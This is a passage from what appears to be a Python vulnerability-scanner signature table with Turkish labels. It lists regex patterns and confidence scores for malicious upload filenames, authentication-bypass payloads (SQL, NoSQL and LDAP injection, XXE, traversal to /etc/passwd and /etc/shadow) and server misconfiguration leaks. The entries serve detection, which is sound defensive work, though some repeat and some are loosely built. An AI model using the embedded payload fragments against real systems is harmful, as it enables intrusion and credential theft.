    {"desen": r"filename=['\"].*tel:", "guven": 0.6, "aciklama": "Tel protocol"},
    {"desen": r"filename=['\"].*sms:", "guven": 0.6, "aciklama": "SMS protocol"},
    {"desen": r"filename=['\"].*skype:", "guven": 0.6, "aciklama": "Skype protocol"},
    
    # Social Engineering Filenames
    {"desen": r"filename=['\"].*invoice\.exe", "guven": 0.9, "aciklama": "Fake invoice executable"},
    {"desen": r"filename=['\"].*receipt\.scr", "guven": 0.9, "aciklama": "Fake receipt screensaver"},
    {"desen": r"filename=['\"].*document\.com", "guven": 0.9, "aciklama": "Fake document executable"},
    {"desen": r"filename=['\"].*photo\.pif", "guven": 0.85, "aciklama": "Fake photo PIF"},
    {"desen": r"filename=['\"].*video\.bat", "guven": 0.9, "aciklama": "Fake video batch"},
    
    # Ransomware Patterns
    {"desen": r"filename=['\"].*encrypt\.php", "guven": 0.9, "aciklama": "Encryption script"},
    {"desen": r"filename=['\"].*ransom\.php", "guven": 0.95, "aciklama": "Ransomware script"},
    {"desen": r"filename=['\"].*lock\.php", "guven": 0.85, "aciklama": "File locking script"},
    {"desen": r"filename=['\"].*decrypt\.php", "guven": 0.8, "aciklama": "Decryption script"},
    
    # Keylogger Patterns
    {"desen": r"filename=['\"].*keylog\.php", "guven": 0.9, "aciklama": "Keylogger script"},
    {"desen": r"filename=['\"].*capture\.php", "guven": 0.8, "aciklama": "Input capture script"},
    {"desen": r"filename=['\"].*steal\.php", "guven": 0.9, "aciklama": "Data stealing script"},
    
    # Remote Access Tools
    {"desen": r"filename=['\"].*rat\.php", "guven": 0.95, "aciklama": "Remote access tool"},
    {"desen": r"filename=['\"].*remote\.php", "guven": 0.8, "aciklama": "Remote control script"},
    {"desen": r"filename=['\"].*backdoor\.php", "guven": 0.95, "aciklama": "Backdoor script"},
    
    # Browser Exploitation
    {"desen": r"filename=['\"].*exploit\.html", "guven": 0.9, "aciklama": "HTML exploit"},
    {"desen": r"filename=['\"].*0day\.js", "guven": 0.95, "aciklama": "Zero-day JavaScript"},
    {"desen": r"filename=['\"].*payload\.js", "guven": 0.9, "aciklama": "JavaScript payload"},
    
    # Mobile Malware
    {"desen": r"filename=['\"].*\.apk\.php", "guven": 0.9, "aciklama": "Fake APK PHP"},
    {"desen": r"filename=['\"].*mobile\.php", "guven": 0.7, "aciklama": "Mobile targeting script"},
    {"desen": r"filename=['\"].*android\.php", "guven": 0.8, "aciklama": "Android targeting script"},
    
    # IoT Exploitation
    {"desen": r"filename=['\"].*iot\.php", "guven": 0.8, "aciklama": "IoT targeting script"},
    {"desen": r"filename=['\"].*router\.php", "guven": 0.8, "aciklama": "Router targeting script"},
    {"desen": r"filename=['\"].*camera\.php", "guven": 0.8, "aciklama": "Camera targeting script"},
    {"desen": r"\.php|\.exe|\.jsp", "guven": 0.85, "aciklama": "Tehlikeli uzantı içeren dosya"}
],

ZafiyetTipi.AUTH_BYPASS: [
    {"desen": r"logged_in.*?false", "guven": 0.9, "aciklama": "Yetki atlama denemesi"},
    # Temel Yetki Atlama Desenleri
    {"desen": r"logged_in.*?false", "guven": 0.9, "aciklama": "Yetki atlama denemesi"},
    {"desen": r"admin.*?=0", "guven": 0.85, "aciklama": "Admin yetkisi atlama"},
    {"desen": r"is_admin.*?false", "guven": 0.88, "aciklama": "Admin kontrolü bypass"},
    {"desen": r"authenticated.*?=false", "guven": 0.87, "aciklama": "Kimlik doğrulama bypass"},
    {"desen": r"user_role.*?guest", "guven": 0.82, "aciklama": "Rol tabanlı yetki atlama"},
    
    # Session ve Token Bypass
    {"desen": r"session_id.*?null", "guven": 0.84, "aciklama": "Session bypass denemesi"},
    {"desen": r"token.*?expired", "guven": 0.79, "aciklama": "Süresi dolmuş token kullanımı"},
    {"desen": r"csrf_token.*?invalid", "guven": 0.81, "aciklama": "CSRF token bypass"},
    {"desen": r"jwt.*?tampered", "guven": 0.86, "aciklama": "JWT token manipülasyonu"},
    {"desen": r"bearer.*?none", "guven": 0.83, "aciklama": "Bearer token bypass"},
    
    # Cookie Manipülasyonu
    {"desen": r"cookie.*?modified", "guven": 0.78, "aciklama": "Cookie manipülasyonu"},
    {"desen": r"auth_cookie.*?deleted", "guven": 0.85, "aciklama": "Auth cookie silme"},
    {"desen": r"secure_flag.*?false", "guven": 0.76, "aciklama": "Güvenli cookie bypass"},
    {"desen": r"httponly.*?disabled", "guven": 0.77, "aciklama": "HttpOnly bypass"},
    {"desen": r"samesite.*?none", "guven": 0.74, "aciklama": "SameSite bypass"},
    
    # Header Manipülasyonu
    {"desen": r"x-forwarded-for.*?127\.0\.0\.1", "guven": 0.72, "aciklama": "IP spoofing için header"},
    {"desen": r"x-real-ip.*?localhost", "guven": 0.73, "aciklama": "IP bypass header"},
    {"desen": r"authorization.*?missing", "guven": 0.88, "aciklama": "Authorization header eksik"},
    {"desen": r"x-auth-token.*?null", "guven": 0.84, "aciklama": "Auth token header bypass"},
    {"desen": r"user-agent.*?admin", "guven": 0.68, "aciklama": "User-Agent spoofing"},
    
    # Parameter Pollution
    {"desen": r"admin=0&admin=1", "guven": 0.89, "aciklama": "Parameter pollution"},
    {"desen": r"user_id=1&user_id=2", "guven": 0.82, "aciklama": "User ID pollution"},
    {"desen": r"role=user&role=admin", "guven": 0.87, "aciklama": "Role pollution"},
    {"desen": r"auth=false&auth=true", "guven": 0.85, "aciklama": "Auth parameter pollution"},
    {"desen": r"permission=read&permission=write", "guven": 0.81, "aciklama": "Permission pollution"},
    
    # SQL Injection için Yetki Bypass
    {"desen": r"'.*or.*1=1.*--", "guven": 0.91, "aciklama": "SQL injection yetki bypass"},
    {"desen": r"admin'.*or.*'1'='1", "guven": 0.89, "aciklama": "SQL auth bypass"},
    {"desen": r"union.*select.*admin", "guven": 0.86, "aciklama": "UNION tabanlı yetki bypass"},
    {"desen": r"'.*and.*sleep\(", "guven": 0.78, "aciklama": "Blind SQL injection auth"},
    {"desen": r"'.*waitfor.*delay", "guven": 0.77, "aciklama": "Time-based SQL auth bypass"},
    
    # NoSQL Injection
    {"desen": r"\$ne.*null", "guven": 0.83, "aciklama": "NoSQL yetki bypass"},
    {"desen": r"\$or.*\[\]", "guven": 0.81, "aciklama": "MongoDB yetki bypass"},
    {"desen": r"\$where.*function", "guven": 0.79, "aciklama": "NoSQL function injection"},
    {"desen": r"\$regex.*\.\*", "guven": 0.76, "aciklama": "NoSQL regex bypass"},
    {"desen": r"\$gt.*0", "guven": 0.74, "aciklama": "NoSQL karşılaştırma bypass"},
    
    # Path Traversal ile Yetki Bypass
    {"desen": r"\.\.\/.*admin", "guven": 0.88, "aciklama": "Path traversal admin erişim"},
    {"desen": r"\.\.\\.*config", "guven": 0.85, "aciklama": "Config dosya erişimi"},
    {"desen": r"%2e%2e%2f.*secret", "guven": 0.83, "aciklama": "URL encoded traversal"},
    {"desen": r"\.\.\/.*passwd", "guven": 0.89, "aciklama": "Sistem dosya erişimi"},
    {"desen": r"\.\.\/.*shadow", "guven": 0.91, "aciklama": "Shadow dosya erişimi"},
    
    # HTTP Method Override
    {"desen": r"_method=PUT", "guven": 0.76, "aciklama": "HTTP method override"},
    {"desen": r"X-HTTP-Method-Override:.*DELETE", "guven": 0.78, "aciklama": "Method override header"},
    {"desen": r"_method=PATCH", "guven": 0.74, "aciklama": "PATCH method bypass"},
    {"desen": r"X-HTTP-Method:.*ADMIN", "guven": 0.82, "aciklama": "Custom method bypass"},
    {"desen": r"_method=OPTIONS", "guven": 0.71, "aciklama": "OPTIONS method bypass"},
    
    # Race Condition
    {"desen": r"concurrent.*auth.*requests", "guven": 0.73, "aciklama": "Race condition auth"},
    {"desen": r"parallel.*login.*attempts", "guven": 0.75, "aciklama": "Paralel login bypass"},
    {"desen": r"simultaneous.*session.*creation", "guven": 0.77, "aciklama": "Session race condition"},
    {"desen": r"race.*condition.*privilege", "guven": 0.79, "aciklama": "Privilege escalation race"},
    {"desen": r"timing.*attack.*auth", "guven": 0.74, "aciklama": "Timing attack"},
    
    # Business Logic Bypass
    {"desen": r"negative.*user_id", "guven": 0.81, "aciklama": "Negatif ID bypass"},
    {"desen": r"user_id=0", "guven": 0.84, "aciklama": "Sıfır ID bypass"},
    {"desen": r"user_id=-1", "guven": 0.83, "aciklama": "Eksi ID bypass"},
    {"desen": r"role.*integer.*overflow", "guven": 0.78, "aciklama": "Integer overflow bypass"},
    {"desen": r"permission.*array.*manipulation", "guven": 0.76, "aciklama": "Array manipülasyon bypass"},
    
    # Authentication Bypass Patterns
    {"desen": r"bypass.*authentication", "guven": 0.87, "aciklama": "Direkt auth bypass"},
    {"desen": r"skip.*login.*check", "guven": 0.85, "aciklama": "Login kontrolü atlama"},
    {"desen": r"disable.*security.*check", "guven": 0.89, "aciklama": "Güvenlik kontrolü devre dışı"},
    {"desen": r"force.*login.*success", "guven": 0.86, "aciklama": "Zorla login başarısı"},
    {"desen": r"override.*access.*control", "guven": 0.88, "aciklama": "Erişim kontrolü override"},
    
    # Session Fixation
    {"desen": r"session.*fixation", "guven": 0.84, "aciklama": "Session fixation saldırısı"},
    {"desen": r"PHPSESSID=.*fixed", "guven": 0.82, "aciklama": "PHP session fixation"},
    {"desen": r"JSESSIONID=.*predetermined", "guven": 0.81, "aciklama": "Java session fixation"},
    {"desen": r"session_id.*prediction", "guven": 0.79, "aciklama": "Session ID tahmin"},
    {"desen": r"predictable.*session.*token", "guven": 0.77, "aciklama": "Tahmin edilebilir session"},
    
    # Privilege Escalation
    {"desen": r"privilege.*escalation", "guven": 0.91, "aciklama": "Yetki yükseltme"},
    {"desen": r"horizontal.*privilege.*bypass", "guven": 0.87, "aciklama": "Yatay yetki bypass"},
    {"desen": r"vertical.*privilege.*bypass", "guven": 0.89, "aciklama": "Dikey yetki bypass"},
    {"desen": r"sudo.*without.*password", "guven": 0.92, "aciklama": "Şifresiz sudo"},
    {"desen": r"root.*access.*bypass", "guven": 0.94, "aciklama": "Root erişim bypass"},
    
    # OAuth Bypass
    {"desen": r"oauth.*token.*replay", "guven": 0.83, "aciklama": "OAuth token replay"},
    {"desen": r"access_token.*manipulation", "guven": 0.85, "aciklama": "Access token manipülasyon"},
    {"desen": r"refresh_token.*hijack", "guven": 0.87, "aciklama": "Refresh token çalma"},
    {"desen": r"oauth.*state.*bypass", "guven": 0.81, "aciklama": "OAuth state bypass"},
    {"desen": r"redirect_uri.*manipulation", "guven": 0.79, "aciklama": "Redirect URI bypass"},
    
    # LDAP Injection
    {"desen": r".*\(\|\(.*\)\)", "guven": 0.86, "aciklama": "LDAP injection bypass"},
    {"desen": r".*\(&\(.*\)\)", "guven": 0.84, "aciklama": "LDAP AND injection"},
    {"desen": r".*\(!\(.*\)\)", "guven": 0.82, "aciklama": "LDAP NOT injection"},
    {"desen": r"cn=.*\*\)", "guven": 0.78, "aciklama": "LDAP wildcard bypass"},
    {"desen": r"uid=.*admin.*\*", "guven": 0.85, "aciklama": "LDAP admin bypass"},
    
    # XML/XXE Bypass
    {"desen": r"<!ENTITY.*admin", "guven": 0.81, "aciklama": "XXE admin entity"},
    {"desen": r"SYSTEM.*file://.*passwd", "guven": 0.88, "aciklama": "XXE file read"},
    {"desen": r"<!ENTITY.*%.*file", "guven": 0.83, "aciklama": "XXE parameter entity"},
    {"desen": r"xml.*external.*entity.*auth", "guven": 0.79, "aciklama": "XXE auth bypass"},
    {"desen": r"DOCTYPE.*auth.*bypass", "guven": 0.77, "aciklama": "XML DOCTYPE bypass"},
    
    # Deserialization Bypass
    {"desen": r"serialized.*admin.*object", "guven": 0.86, "aciklama": "Seri hale getirme bypass"},
    {"desen": r"pickle.*load.*admin", "guven": 0.89, "aciklama": "Python pickle bypass"},
    {"desen": r"unserialize.*auth.*data", "guven": 0.84, "aciklama": "PHP unserialize bypass"},
    {"desen": r"ObjectInputStream.*admin", "guven": 0.82, "aciklama": "Java deserialization"},
    {"desen": r"json.*parse.*admin.*true", "guven": 0.78, "aciklama": "JSON deserialization"},
    
    # Template Injection
    {"desen": r"\{\{.*admin.*\}\}", "guven": 0.83, "aciklama": "Template injection admin"},
    {"desen": r"\$\{.*auth.*bypass.*\}", "guven": 0.85, "aciklama": "Expression language bypass"},
    {"desen": r"<%.*admin.*%>", "guven": 0.81, "aciklama": "JSP template bypass"},
    {"desen": r"\{\%.*if.*admin.*\%\}", "guven": 0.79, "aciklama": "Jinja2 template bypass"},
    {"desen": r"#{.*auth.*true.*}", "guven": 0.77, "aciklama": "SpEL expression bypass"},
    
    # GraphQL Bypass
    {"desen": r"introspection.*admin.*schema", "guven": 0.76, "aciklama": "GraphQL introspection"},
    {"desen": r"mutation.*admin.*privilege", "guven": 0.84, "aciklama": "GraphQL mutation bypass"},
    {"desen": r"query.*\{.*admin.*\}", "guven": 0.78, "aciklama": "GraphQL admin query"},
    {"desen": r"alias.*admin.*field", "guven": 0.74, "aciklama": "GraphQL alias bypass"},
    {"desen": r"fragment.*admin.*data", "guven": 0.72, "aciklama": "GraphQL fragment bypass"},
    
    # WebSocket Bypass
    {"desen": r"ws://.*admin.*connection", "guven": 0.79, "aciklama": "WebSocket admin bypass"},
    {"desen": r"websocket.*auth.*bypass", "guven": 0.81, "aciklama": "WebSocket auth bypass"},
    {"desen": r"socket\.io.*admin.*namespace", "guven": 0.77, "aciklama": "Socket.IO admin bypass"},
    {"desen": r"ws.*upgrade.*admin", "guven": 0.75, "aciklama": "WebSocket upgrade bypass"},
    {"desen": r"websocket.*origin.*bypass", "guven": 0.73, "aciklama": "WebSocket origin bypass"},
    
    # API Bypass Patterns
    {"desen": r"api\/v1\/admin\/.*bypass", "guven": 0.85, "aciklama": "API admin endpoint bypass"},
    {"desen": r"\/api\/.*auth=false", "guven": 0.83, "aciklama": "API auth parameter bypass"},
    {"desen": r"rest\/.*admin\/.*unauthorized", "guven": 0.81, "aciklama": "REST API bypass"},
    {"desen": r"graphql.*admin.*unauthorized", "guven": 0.79, "aciklama": "GraphQL unauthorized"},
    {"desen": r"api_key=.*invalid.*admin", "guven": 0.82, "aciklama": "API key bypass"},
    
    # Mobile App Bypass
    {"desen": r"mobile.*api.*bypass", "guven": 0.76, "aciklama": "Mobile API bypass"},
    {"desen": r"app.*secret.*bypass", "guven": 0.84, "aciklama": "App secret bypass"},
    {"desen": r"device.*id.*manipulation", "guven": 0.78, "aciklama": "Device ID bypass"},
    {"desen": r"app.*signature.*bypass", "guven": 0.82, "aciklama": "App signature bypass"},
    {"desen": r"mobile.*certificate.*pinning.*bypass", "guven": 0.87, "aciklama": "Certificate pinning bypass"},
    
    # Cloud Bypass
    {"desen": r"aws.*iam.*bypass", "guven": 0.89, "aciklama": "AWS IAM bypass"},
    {"desen": r"azure.*ad.*bypass", "guven": 0.87, "aciklama": "Azure AD bypass"},
    {"desen": r"gcp.*service.*account.*bypass", "guven": 0.85, "aciklama": "GCP service account bypass"},
    {"desen": r"cloud.*metadata.*admin", "guven": 0.83, "aciklama": "Cloud metadata bypass"},
    {"desen": r"instance.*profile.*privilege", "guven": 0.81, "aciklama": "Instance profile bypass"},
    
    # Container Bypass
    {"desen": r"docker.*escape.*root", "guven": 0.91, "aciklama": "Docker container escape"},
    {"desen": r"kubernetes.*service.*account.*bypass", "guven": 0.88, "aciklama": "Kubernetes service account"},
    {"desen": r"container.*privilege.*escalation", "guven": 0.86, "aciklama": "Container privilege escalation"},
    {"desen": r"pod.*security.*context.*bypass", "guven": 0.84, "aciklama": "Pod security bypass"},
    {"desen": r"namespace.*admin.*access", "guven": 0.82, "aciklama": "Namespace admin erişim"},
    
    # Kerberos Bypass
    {"desen": r"kerberos.*ticket.*forged", "guven": 0.92, "aciklama": "Kerberos ticket forgery"},
    {"desen": r"golden.*ticket.*attack", "guven": 0.94, "aciklama": "Golden ticket saldırısı"},
    {"desen": r"silver.*ticket.*bypass", "guven": 0.91, "aciklama": "Silver ticket bypass"},
    {"desen": r"kerberoasting.*admin", "guven": 0.89, "aciklama": "Kerberoasting admin"},
    {"desen": r"asreproasting.*bypass", "guven": 0.87, "aciklama": "ASREPRoasting bypass"},
    
    # SAML Bypass
    {"desen": r"saml.*assertion.*manipulation", "guven": 0.88, "aciklama": "SAML assertion bypass"},
    {"desen": r"xml.*signature.*bypass", "guven": 0.86, "aciklama": "XML signature bypass"},
    {"desen": r"saml.*response.*replay", "guven": 0.84, "aciklama": "SAML response replay"},
    {"desen": r"assertion.*attribute.*admin", "guven": 0.82, "aciklama": "SAML attribute bypass"},
    {"desen": r"saml.*audience.*bypass", "guven": 0.80, "aciklama": "SAML audience bypass"},
    
    # Additional Advanced Patterns
    {"desen": r"authentication.*logic.*flaw", "guven": 0.85, "aciklama": "Auth logic hatası"},
    {"desen": r"authorization.*matrix.*bypass", "guven": 0.83, "aciklama": "Authorization matrix bypass"},
    {"desen": r"access.*control.*misconfiguration", "guven": 0.81, "aciklama": "Erişim kontrolü yanlış yapılandırma"},
    {"desen": r"broken.*authentication", "guven": 0.89, "aciklama": "Bozuk kimlik doğrulama"},
    {"desen": r"insufficient.*authentication", "guven": 0.87, "aciklama": "Yetersiz kimlik doğrulama"},
    
    # Protocol Specific Bypass
    {"desen": r"ftp.*anonymous.*admin", "guven": 0.78, "aciklama": "FTP anonymous admin"},
    {"desen": r"smtp.*relay.*admin", "guven": 0.76, "aciklama": "SMTP relay admin"},
    {"desen": r"snmp.*community.*admin", "guven": 0.82, "aciklama": "SNMP community bypass"},
    {"desen": r"telnet.*default.*admin", "guven": 0.84, "aciklama": "Telnet default admin"},
    {"desen": r"ssh.*key.*bypass.*admin", "guven": 0.88, "aciklama": "SSH key bypass admin"},
    
    # Time-based Bypass
    {"desen": r"time.*based.*auth.*bypass", "guven": 0.79, "aciklama": "Zaman tabanlı auth bypass"},
    {"desen": r"token.*expiry.*manipulation", "guven": 0.81, "aciklama": "Token süre manipülasyonu"},
    {"desen": r"session.*timeout.*bypass", "guven": 0.77, "aciklama": "Session timeout bypass"},
    {"desen": r"rate.*limit.*bypass.*admin", "guven": 0.83, "aciklama": "Rate limit bypass"},
    {"desen": r"admin.*?=0", "guven": 0.85, "aciklama": "Admin yetkisi atlama"}
],

ZafiyetTipi.MISCONFIG: [
    {"desen": r"Index of /", "guven": 0.9, "aciklama": "Açık dizin listeleme"},
    # Temel Sunucu Yapılandırma Hataları
    {"desen": r"Index of /", "guven": 0.9, "aciklama": "Açık dizin listeleme"},
    {"desen": r"Server: Apache|nginx|IIS|LiteSpeed", "guven": 0.8, "aciklama": "Sunucu bilgisi ifşası"},
    {"desen": r"X-Powered-By: PHP|ASP\.NET|Express", "guven": 0.85, "aciklama": "Backend teknoloji ifşası"},
    {"desen": r"Apache/[\d\.]+.*Server at", "guven": 0.9, "aciklama": "Apache versiyon bilgisi ifşası"},
    {"desen": r"nginx/[\d\.]+ \(Ubuntu\)", "guven": 0.9, "aciklama": "Nginx versiyon ve OS bilgisi ifşası"},
    
    # PHP Yapılandırma Hataları
    {"desen": r"Warning: mysqli_connect\(\)", "guven": 0.95, "aciklama": "PHP MySQL bağlantı hatası ifşası"},
    {"desen": r"Fatal error: Uncaught Error", "guven": 0.9, "aciklama": "PHP fatal error ifşası"},
    {"desen": r"Parse error: syntax error", "guven": 0.95, "aciklama": "PHP parse error"},
    {"desen": r"Notice: Undefined variable", "guven": 0.8, "aciklama": "PHP notice hatası"},
    {"desen": r"phpinfo\(\)", "guven": 0.99, "aciklama": "phpinfo() fonksiyonu aktif"},
    {"desen": r"display_errors = On", "guven": 0.95, "aciklama": "PHP hata gösterimi aktif"},
    {"desen": r"error_reporting = E_ALL", "guven": 0.9, "aciklama": "Tüm PHP hataları rapor ediliyor"},
    {"desen": r"expose_php = On", "guven": 0.85, "aciklama": "PHP versiyon bilgisi ifşa ediliyor"},
    {"desen": r"allow_url_include = On", "guven": 0.95, "aciklama": "Tehlikeli PHP ayarı - URL include"},
    {"desen": r"register_globals = On", "guven": 0.99, "aciklama": "Kritik güvenlik açığı - register_globals"},
    
    # ASP.NET ve IIS Hataları
    {"desen": r"Server Error in '/' Application", "guven": 0.9, "aciklama": "ASP.NET server hatası"},
    {"desen": r"System\.Web\.HttpException", "guven": 0.9, "aciklama": "ASP.NET HTTP exception"},
    {"desen": r"Stack Trace:", "guven": 0.85, "aciklama": "Stack trace bilgisi ifşası"},
    {"desen": r"Version Information: Microsoft \.NET Framework", "guven": 0.85, "aciklama": ".NET Framework versiyon ifşası"},
    {"desen": r"customErrors mode=\"Off\"", "guven": 0.95, "aciklama": "ASP.NET özel hatalar kapalı"},
    {"desen": r"compilation debug=\"true\"", "guven": 0.9, "aciklama": "ASP.NET debug modu aktif"},
    {"desen": r"trace enabled=\"true\"", "guven": 0.9, "aciklama": "ASP.NET trace aktif"},
    
    # Veritabanı Hata İfşaları
    {"desen": r"MySQL Error: You have an error in your SQL syntax", "guven": 0.95, "aciklama": "MySQL SQL syntax hatası"},
    {"desen": r"ORA-\d+:", "guven": 0.9, "aciklama": "Oracle veritabanı hatası"},
    {"desen": r"Microsoft OLE DB Provider for ODBC Drivers", "guven": 0.9, "aciklama": "MSSQL ODBC hatası"},
    {"desen": r"PostgreSQL query failed", "guven": 0.9, "aciklama": "PostgreSQL sorgu hatası"},
    {"desen": r"SQLite3::SQLException", "guven": 0.9, "aciklama": "SQLite hata ifşası"},
    {"desen": r"ERROR: column \".*\" does not exist", "guven": 0.85, "aciklama": "PostgreSQL kolon hatası"},
    {"desen": r"Table '.*' doesn't exist", "guven": 0.9, "aciklama": "MySQL tablo bulunamadı hatası"},
    {"desen": r"Invalid column name", "guven": 0.85, "aciklama": "MSSQL geçersiz kolon hatası"},
    {"desen": r"Duplicate entry '.*' for key", "guven": 0.8, "aciklama": "MySQL duplicate key hatası"},
    {"desen": r"Access denied for user", "guven": 0.95, "aciklama": "MySQL erişim hatası"},
    
    # Uygulama Sunucusu Hataları
    {"desen": r"Apache Tomcat/[\d\.]+ - Error report", "guven": 0.9, "aciklama": "Apache Tomcat hata raporu"},
    {"desen": r"JBoss Web/[\d\.]+ - Error report", "guven": 0.9, "aciklama": "JBoss hata raporu"},
    {"desen": r"WebLogic Server", "guven": 0.85, "aciklama": "Oracle WebLogic Server"},
    {"desen": r"IBM WebSphere Application Server", "guven": 0.85, "aciklama": "IBM WebSphere ifşası"},
    {"desen": r"GlassFish Server", "guven": 0.85, "aciklama": "GlassFish Server ifşası"},
    {"desen": r"java\.lang\.NullPointerException", "guven": 0.9, "aciklama": "Java NullPointer exception"},
    {"desen": r"java\.sql\.SQLException", "guven": 0.9, "aciklama": "Java SQL exception"},
    {"desen": r"org\.springframework\..*Exception", "guven": 0.85, "aciklama": "Spring Framework exception"},
    {"desen": r"Hibernate\..*Exception", "guven": 0.85, "aciklama": "Hibernate ORM exception"},
    
    # CMS ve Framework Hataları
    {"desen": r"WordPress database error", "guven": 0.9, "aciklama": "WordPress veritabanı hatası"},
    {"desen": r"wp-config\.php", "guven": 0.95, "aciklama": "WordPress config dosyası ifşası"},
    {"desen": r"Joomla! - Web Installer", "guven": 0.95, "aciklama": "Joomla installer aktif"},
    {"desen": r"Drupal.*already installed", "guven": 0.8, "aciklama": "Drupal kurulum bilgisi"},
    {"desen": r"Django.*RuntimeError", "guven": 0.9, "aciklama": "Django framework hatası"},
    {"desen": r"Rails\.env.*development", "guven": 0.95, "aciklama": "Ruby on Rails development modu"},
    {"desen": r"Laravel.*Facade", "guven": 0.85, "aciklama": "Laravel framework ifşası"},
    {"desen": r"CodeIgniter.*system folder", "guven": 0.9, "aciklama": "CodeIgniter framework ifşası"},
    
    # Backup ve Geçici Dosya İfşaları
    {"desen": r"\.bak|\.backup|\.old|\.tmp", "guven": 0.9, "aciklama": "Backup/geçici dosya ifşası"},
    {"desen": r"config\.php\.bak", "guven": 0.95, "aciklama": "Config backup dosyası"},
    {"desen": r"database\.sql\.gz", "guven": 0.99, "aciklama": "Veritabanı dump dosyası"},
    {"desen": r"\.git/config", "guven": 0.95, "aciklama": "Git repository ifşası"},
    {"desen": r"\.svn/entries", "guven": 0.95, "aciklama": "SVN repository ifşası"},
    {"desen": r"\.env", "guven": 0.99, "aciklama": "Environment config dosyası"},
    {"desen": r"web\.config\.bak", "guven": 0.95, "aciklama": "IIS config backup"},
    {"desen": r"\.htaccess\.bak", "guven": 0.9, "aciklama": "Apache htaccess backup"},
    
    # API ve Web Servisi Hataları
    {"desen": r"\"error\".*\"unauthorized\"", "guven": 0.8, "aciklama": "API unauthorized hatası"},
    {"desen": r"\"message\".*\"Internal Server Error\"", "guven": 0.85, "aciklama": "API internal server error"},
    {"desen": r"SOAP-ENV:Fault", "guven": 0.85, "aciklama": "SOAP web servis hatası"},
    {"desen": r"XML Parsing Error", "guven": 0.8, "aciklama": "XML parsing hatası"},
    {"desen": r"JSON\.parse.*unexpected token", "guven": 0.8, "aciklama": "JSON parsing hatası"},
    {"desen": r"REST API.*endpoint not found", "guven": 0.8, "aciklama": "REST API endpoint hatası"},
    
    # Debug ve Trace Bilgileri
    {"desen": r"DEBUG.*password|DEBUG.*secret", "guven": 0.95, "aciklama": "Debug bilgisinde şifre ifşası"},
    {"desen": r"TRACE|DEBUG.*SQL", "guven": 0.9, "aciklama": "SQL sorgu trace bilgisi"},
    {"desen": r"console\.log.*password", "guven": 0.9, "aciklama": "JavaScript console şifre ifşası"},
    {"desen": r"printStackTrace\(\)", "guven": 0.85, "aciklama": "Java stack trace"},
    {"desen": r"Traceback \(most recent call last\)", "guven": 0.9, "aciklama": "Python traceback"},
    {"desen": r"Error\s+\d+\s+on\s+line\s+\d+", "guven": 0.8, "aciklama": "Script hata satır bilgisi"},
    
    # Ağ ve Sistem Yapılandırma Hataları
    {"desen": r"Listen 80|Listen 443", "guven": 0.8, "aciklama": "Apache port yapılandırması"},
    {"desen": r"DocumentRoot.*var/www", "guven": 0.8, "aciklama": "Apache document root ifşası"},
    {"desen": r"ServerName.*localhost", "guven": 0.85, "aciklama": "Localhost server yapılandırması"},
    {"desen": r"root.*mysql.*password", "guven": 0.99, "aciklama": "MySQL root şifre bilgisi"},
    {"desen": r"connection string.*password=", "guven": 0.95, "aciklama": "Veritabanı bağlantı şifresi"},
    {"desen": r"smtp.*password", "guven": 0.9, "aciklama": "SMTP şifre bilgisi"},
    {"desen": r"ftp.*password", "guven": 0.9, "aciklama": "FTP şifre bilgisi"},
    
    # Güvenlik Header Eksiklikleri
    {"desen": r"X-Frame-Options.*DENY", "guven": 0.7, "aciklama": "X-Frame-Options header mevcut"},
    {"desen": r"Content-Security-Policy", "guven": 0.7, "aciklama": "CSP header mevcut"},
    {"desen": r"Strict-Transport-Security", "guven": 0.7, "aciklama": "HSTS header mevcut"},
    {"desen": r"X-Content-Type-Options.*nosniff", "guven": 0.7, "aciklama": "Content-Type-Options header"},
    {"desen": r"X-XSS-Protection.*1", "guven": 0.7, "aciklama": "XSS Protection header"},
    
    # Dosya Upload Hataları
    {"desen": r"upload.*failed.*permission", "guven": 0.85, "aciklama": "Dosya upload izin hatası"},
    {"desen": r"move_uploaded_file.*failed", "guven": 0.9, "aciklama": "PHP upload hatası"},
    {"desen": r"upload_max_filesize", "guven": 0.8, "aciklama": "PHP upload limit bilgisi"},
    {"desen": r"file_uploads = Off", "guven": 0.8, "aciklama": "PHP file upload kapalı"},
    
    # Session ve Cookie Hataları
    {"desen": r"session_start\(\).*headers already sent", "guven": 0.85, "aciklama": "PHP session başlatma hatası"},
    {"desen": r"PHPSESSID", "guven": 0.7, "aciklama": "PHP session ID ifşası"},
    {"desen": r"JSESSIONID", "guven": 0.7, "aciklama": "Java session ID ifşası"},
    {"desen": r"ASP\.NET_SessionId", "guven": 0.7, "aciklama": "ASP.NET session ID"},
    {"desen": r"Set-Cookie.*secure", "guven": 0.6, "aciklama": "Güvenli cookie ayarı"},
    {"desen": r"Set-Cookie.*httponly", "guven": 0.6, "aciklama": "HTTP-only cookie ayarı"},
    
    # SSL/TLS Yapılandırma Hataları
    {"desen": r"SSL certificate.*expired", "guven": 0.9, "aciklama": "SSL sertifika süresi dolmuş"},
    {"desen": r"SSL certificate.*self-signed", "guven": 0.85, "aciklama": "Self-signed SSL sertifikası"},
    {"desen": r"TLS.*SSLv3", "guven": 0.95, "aciklama": "Güvensiz SSL protokolü"},
    {"desen": r"cipher.*RC4", "guven": 0.9, "aciklama": "Zayıf şifreleme algoritması"},
    
    # Yetkilendirme ve Kimlik Doğrulama Hataları
    {"desen": r"401 Unauthorized", "guven": 0.8, "aciklama": "Yetkilendirme hatası"},
    {"desen": r"403 Forbidden", "guven": 0.8, "aciklama": "Erişim yasağı"},
    {"desen": r"Basic realm=", "guven": 0.8, "aciklama": "HTTP Basic Auth"},
    {"desen": r"WWW-Authenticate.*Basic", "guven": 0.8, "aciklama": "Basic authentication header"},
    {"desen": r"LDAP.*bind failed", "guven": 0.9, "aciklama": "LDAP bağlantı hatası"},
    {"desen": r"Active Directory.*error", "guven": 0.85, "aciklama": "Active Directory hatası"},
    
    # İçerik ve Path Bilgileri
    {"desen": r"/var/www/html", "guven": 0.8, "aciklama": "Linux web root path"},
    {"desen": r"C:\\inetpub\\wwwroot", "guven": 0.8, "aciklama": "Windows IIS root path"},
    {"desen": r"/usr/share/nginx/html", "guven": 0.8, "aciklama": "Nginx default path"},
    {"desen": r"/etc/passwd", "guven": 0.95, "aciklama": "Linux passwd dosyası ifşası"},
    {"desen": r"/etc/shadow", "guven": 0.99, "aciklama": "Linux shadow dosyası ifşası"},
    {"desen": r"C:\\Windows\\system32", "guven": 0.85, "aciklama": "Windows system path"},
    
    # Cache ve Performans Hataları
    {"desen": r"cache.*failed.*write", "guven": 0.8, "aciklama": "Cache yazma hatası"},
    {"desen": r"Redis.*connection refused", "guven": 0.85, "aciklama": "Redis bağlantı hatası"},
